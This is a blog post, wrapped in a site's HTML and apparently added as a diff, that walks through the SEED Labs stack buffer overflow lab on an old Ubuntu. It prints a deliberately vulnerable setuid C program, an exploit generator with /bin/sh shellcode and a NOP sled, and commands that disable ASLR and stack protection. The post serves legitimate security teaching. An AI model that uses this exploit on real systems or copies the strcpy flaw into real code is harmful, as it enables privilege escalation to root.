@@ -1,0 +1,706 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="https://gitee.com/gentlecp/ImgUrl/raw/master/20210302203104.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  
+    <meta name="description" content="记录我的学习和生活">
+  
+  <meta name="author" content="GentleCP">
+  <meta name="keywords" content="">
+  
+  <title>【软件安全】缓冲区溢出攻击(stack overflow)实践 - 求索</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      
+        
+          
+        
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/themes/prism.min.css" />
+      
+      
+        <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.22.0/plugins/line-numbers/prism-line-numbers.min.css" />
+      
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"blog.gentlecp.com","root":"/","version":"1.8.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":"e327374203a31813ad9ef3899d6f3eb5","google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>求索|CP</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://gitee.com/gentlecp/ImgUrl/raw/master/20210302191739.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="【软件安全】缓冲区溢出攻击(stack overflow)实践">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-author" aria-hidden="true"></i>
+      GentleCP
+    </span>
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-03-13 10:49" pubdate>
+        2021年3月13日 上午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      22
+       分钟
+    </span>
+  
+
+  
+  
+    
+      <!-- 不蒜子统计文章PV -->
+      <span id="busuanzi_container_page_pv" style="display: none">
+        <i class="iconfont icon-eye" aria-hidden="true"></i>
+        <span id="busuanzi_value_page_pv"></span> 次
+      </span>
+    
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">【软件安全】缓冲区溢出攻击(stack overflow)实践</h1>
+            
+            <div class="markdown-body">
+              <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在研究<code>stack overflow</code>的复现，发现网上许多教程都偏老了，且许多关键步骤没有说明清楚，导致小白在一步步操作的时候经常出现无法正确获取<code>shellcode</code>的情况，本人也是历经诸多<strong>大坑</strong>，总算是成功复现了这一过程。下面是溢出成功后的效果图。<br><img src="https://img-blog.csdnimg.cn/20200929162546732.png#pic_center" srcset="/img/loading.gif" alt=""></p>
+<blockquote>
+<p>个中会涉及到参数在函数栈中的存储，栈的返回地址，帧指针，函数如何执行的过程，这部分不再赘述，自行查阅相关资料。</p>
+</blockquote>
+<h1 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h1><p><strong>工欲善其事，必先利其器</strong>，由于<code>stack overflow</code>已经是上古时代的漏洞，在现行的许多操作系统发行版中已经做到了很好的保护机制，如果以这些系统作为攻击入口，小白无异以卵击石。因此，我们需要限制一下所用的操作系统，这里给出我使用的环境：</p>
+<ul>
+<li><strong>OS</strong>: ubuntu12.04，采用了<code>SEED LAB</code>实验室提供的环境，<a target="_blank" rel="noopener" href="https://seedsecuritylabs.org/lab_env.html">点击这里查看</a></li>
+<li><strong>虚拟机软件</strong>：Vmware workstation 16</li>
+</ul>
+<h1 id="攻击目标与原理"><a href="#攻击目标与原理" class="headerlink" title="攻击目标与原理"></a>攻击目标与原理</h1><ul>
+<li>攻击目标是获取到操作系统的<code>root</code>权限</li>
+<li>攻击原理是目标程序存在的缓冲区溢出漏洞，构造特定的输入内容覆盖原始的返回地址，以执行相应的<code>shellcode</code>。</li>
+</ul>
+<h2 id="漏洞程序"><a href="#漏洞程序" class="headerlink" title="漏洞程序"></a>漏洞程序</h2><p>下面是漏洞程序(<code>stack.c</code>)的代码，它所做的主要工作是读取同目录下<code>badfile</code>文件的内容，并将其复制到函数的临时数组变量<code>buffer[]</code>中，但输入的内容大于<code>buffer</code>的容量时，就可能导致数据覆盖函数栈中的返回地址，而攻击者通过精心计算原返回地址的位置，将其替换成<code>shellcode</code>的地址，从而导致<code>shellcode</code>执行，获得<code>root</code>权限。</p>
+<blockquote>
+<p>获取<code>root</code>权限的前提是漏洞程序通过<code>root</code>权限编译，赋予相应<code>root</code>权限</p>
+</blockquote>
+<div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* stack.c */</span>
+<span class="token comment">/* This program has a buffer overflow vulnerability. */</span>
+<span class="token comment">/* Our task is to exploit this vulnerability */</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">bof</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//和原程序不一样的地方在此处,如果没有修改,最终结果会是return properly 无法攻击成功.获得root权限</span>
+
+<span class="token comment">/* The following statement has a buffer overflow problem */</span>
+	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
+	badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"badfile"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">fread</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">bof</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Returned Properly\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<h2 id="攻击程序"><a href="#攻击程序" class="headerlink" title="攻击程序"></a>攻击程序</h2><p>攻击程序(<code>exploit.c</code>)主要是用来生成指定的<code>badfile</code>，实现<code>shellcode</code>的注入，让漏洞程序能够精确执行。其中<code>shellcode</code>就是让程序执行<code>/bin/sh</code>的相应汇编代码，程序创建了一个<code>buffer</code>数组，用于存储<code>shellcode</code>，同时在<code>shellcode</code>前面用<code>0x90</code>(NOP指令，不做操作执行下一条指令)填充，这使得<code>shellcode</code>有多个入口点，增大执行概率。具体如下：<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* exploit.c */</span>
+<span class="token comment">/* A program that creates a file containing code for launching shell*/</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+
+<span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>
+<span class="token string">"\x31\xc0"</span>    <span class="token comment">//xorl %eax,%eax</span>
+<span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span>
+<span class="token string">"\x68"</span><span class="token string">"//sh"</span>  <span class="token comment">//pushl $0x68732f2f</span>
+<span class="token string">"\x68"</span><span class="token string">"/bin"</span>  <span class="token comment">//pushl $0x6e69622f</span>
+<span class="token string">"\x89\xe3"</span>    <span class="token comment">//movl %esp,%ebx</span>
+<span class="token string">"\x50"</span>        <span class="token comment">//pushl %eax</span>
+<span class="token string">"\x53"</span>        <span class="token comment">//pushl %ebx</span>
+<span class="token string">"\x89\xe1"</span>    <span class="token comment">//movl %esp,%ecx</span>
+<span class="token string">"\x99"</span>        <span class="token comment">//cdq</span>
+<span class="token string">"\xb0\x0b"</span>    <span class="token comment">//movb $0x0b,%al</span>
+<span class="token string">"\xcd\x80"</span>    <span class="token comment">//int $0x80</span>
+<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
+	
+	<span class="token comment">/* Initialize buffer with 0x90 (NOP instruction) */</span>
+	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	<span class="token comment">/* You need to fill the buffer with appropriate contents here */</span>
+	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token string">"\x??\x??\x??\x??"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//这里从24填写，但是上面漏洞程序buffer只有12，我也没搞懂</span>
+	<span class="token function">strcpy</span><span class="token punctuation">(</span>buffer<span class="token operator">+</span><span class="token number">100</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	
+	<span class="token comment">/* Save the contents to the file "badfile" */</span>
+	badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"./badfile"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p>
+<h1 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h1><p>总体的攻击步骤包括：</p>
+<ol>
+<li>关闭现有安全机制 关闭ASLR（内存地址随机化），用<code>zsh</code>替换<code>sh</code></li>
+<li>以<code>root</code>身份编译<code>stack.c</code>（漏洞程序）</li>
+<li>确定<code>shellcode</code>在内存中的地址</li>
+<li>执行攻击程序，漏洞程序，查看攻击效果</li>
+</ol>
+<h2 id="关闭现有安全机制"><a href="#关闭现有安全机制" class="headerlink" title="关闭现有安全机制"></a>关闭现有安全机制</h2><ul>
+<li>关闭ASLR<br><code>linux</code>系统为了防止<code>stack overflow</code>，默认采用了<code>ASLR</code>(内存地址随机化)，这导致我们无法确定<code>shellcode</code>在内存中的位置，为了简便需要关闭  <div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text"># 关闭方式1
+sudo sysctl -w kernel.randomize_va_space&#x3D;0
+# 关闭方式2
+sudo  -s
+echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space
+exit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></li>
+<li>用<code>zsh</code>替换<code>sh</code><br>  在<code>ubuntu12.04,ubuntu16.04</code>中，<code>/bin/sh</code>实际上指向一个<code>/bin/dash</code>的链接文件，当其发现自己在一个特权程序中运行时，会将有效用户ID改成实际用户ID，让我们无法获得<code>root</code>权限。替换方式如下：  <div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo su
+cd &#x2F;bin
+cp sh sh.bak  # 备份
+rm sh
+ln -s zsh sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>
+<blockquote>
+<p>还有一种替代解决方案是更改<code>shellcode</code>中<code>&quot;\x68&quot;&quot;//sh&quot;</code>为<code>&quot;\x68&quot;&quot;/zsh&quot;</code></p>
+</blockquote>
+</li>
+</ul>
+<h2 id="以root身份编译漏洞程序"><a href="#以root身份编译漏洞程序" class="headerlink" title="以root身份编译漏洞程序"></a>以root身份编译漏洞程序</h2><p>确保程序有<code>root</code>权限<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo gcc -g -z execstack -fno-stack-protector -o stack stack.c
+sudo chmod u+s stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p>
+<h2 id="确定shellcode在内存中位置"><a href="#确定shellcode在内存中位置" class="headerlink" title="确定shellcode在内存中位置"></a>确定<code>shellcode</code>在内存中位置</h2><p>注意<code>shellcode</code>本质是被放在<code>badfile</code>文件中，而漏洞程序读取<code>badfile</code>复制到<code>buffer</code>数组中，那么<code>badfile</code>的起始位置就是<code>stack.c</code>中<code>buffer</code>的起始位置，因此我们需要让<code>shellcode</code>的地址刚好被写在漏洞程序函数<code>bof</code>返回地址的位置。具体如下图：<br><img src="https://img-blog.csdnimg.cn/20200929171137106.png#pic_center" srcset="/img/loading.gif" style="zoom:50%;" /><br>用<code>gdk</code>调试<code>stack</code>，反汇编<code>main</code>函数，如下：</p>
+<div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">gdb stack
+disass main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div>
+<p><img src="https://img-blog.csdnimg.cn/20200929171437517.png#pic_center" srcset="/img/loading.gif" alt=""><br>注意红框处的操作，这是main函数执行后栈给局部变量留出的空间，然后我们查看<code>str</code>的地址，<code>shellcode</code>应该已经被放置在<code>str</code>数组中，距离100的位置。<br>随意找个地方设置断点，并运行，接着查看<code>str</code>的地址，并计算+100后的地址结果</p>
+<div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">b *0x080484af
+r
+p &amp;str
+p&#x2F;x 0xbffff127+100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div>
+<p><img src="https://img-blog.csdnimg.cn/20200930122635574.png#pic_center" srcset="/img/loading.gif" alt=""></p>
+<p>在<code>exploit.c</code>中将<code>\x?\x?\x?\x?</code>的部分用<code>0xbffff18b</code>地址替换<br><img src="https://img-blog.csdnimg.cn/20200930123010982.png#pic_center" srcset="/img/loading.gif" alt=""></p>
+<h2 id="执行攻击程序"><a href="#执行攻击程序" class="headerlink" title="执行攻击程序"></a>执行攻击程序</h2><p>对攻击程序编译并执行得到<code>badfile</code>,再执行<code>./stack</code>查看攻击效果。<br><img src="https://img-blog.csdnimg.cn/20200930123207297.png#pic_center" srcset="/img/loading.gif" alt=""><br>发现指令非法，说明我们没有正确找到<code>shellcode</code>指令地址。</p>
+<blockquote>
+<p>这个地方困扰了我很久，是个大坑，后来发现一篇文章中写到<code>gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./stack的时候，buf的位置会固定在别的地址上。</code>。</p>
+</blockquote>
+<p>即存放<code>shellcode</code>的地址相比原来会有偏差，因此尝试在找到的<code>shellcode</code>地址上进行偏移，这里我尝试了许多种，发现将<code>8b</code>换成<code>ab</code>是可行的。<br><img src="https://img-blog.csdnimg.cn/20200930123530378.png#pic_center" srcset="/img/loading.gif" alt=""><br>再做一次攻击可发现获取到了root权限<br><img src="https://img-blog.csdnimg.cn/20200930123642159.png#pic_center" srcset="/img/loading.gif" alt=""></p>
+<blockquote>
+<p>说明<code>shllcode</code>实际执行相比于调试内存地址偏后了30多位，可以尝试将<code>8b</code>修改成更后面或附近的数值，如<code>af</code>,<code>b4</code>都是可行的。</p>
+</blockquote>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>缓冲区溢出是十分古老却又经典的程序漏洞，许多更近一步的如<code>return-to-libc</code>,<strong>格式化字符串漏洞</strong>，都是基于此基础上做的进一步深入攻击，因此掌握最基础的<code>stack overflow</code>还是很有必要的。这个地方我参考了许多网上许多教程，它们大部分都是调试阶段直接获取到<code>str</code>或者<code>esp</code>地址后通过计算相对位置得到<code>shellcode</code>地址，但根据我的实际操作结果来看有较大出入，实践才是检验真理的唯一标准。参考资料里列举的都是与此实验相关的资料，供读者对比参考。</p>
+<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/zengxyuyu/article/details/53150521">SEED实验:缓冲区溢出漏洞实验__网络攻防实验</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/221081.html">SEED：缓冲区溢出漏洞实验</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/security/">security</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/security/">security</a>
+                    
+                      <a class="hover-with-bg" href="/tags/overflow/">overflow</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/article/48940.html">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Linux 常用命令大全</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/article/64960.html">
+                        <span class="hidden-mobile">【C++】10分钟搞懂内联函数</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                  
+                
+                
+  <script type="text/javascript">
+    Fluid.utils.waitElementVisible('comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'GentleCP/blog.gentlecp.com');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://www.gentlecp.com" target="_blank" rel="nofollow noopener"><span>主站</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/GentleCP/blog.gentlecp.com" target="_blank" rel="nofollow noopener"><span>Repo</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP证123456号
+      </a>
+    </span>
+    
+      
+        <span>
+          <a
+            href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=12345678"
+            rel="nofollow noopener"
+            class="beian-police"
+            target="_blank"
+          >
+            
+              <span style="visibility: hidden; width: 0">|</span>
+              <img src="/img/police_beian.png" srcset="/img/loading.gif" alt="police-icon"/>
+            
+            <span>浙ICP备19022407号-1</span>
+          </a>
+        </span>
+      
+    
+  </div>
+
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+    
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
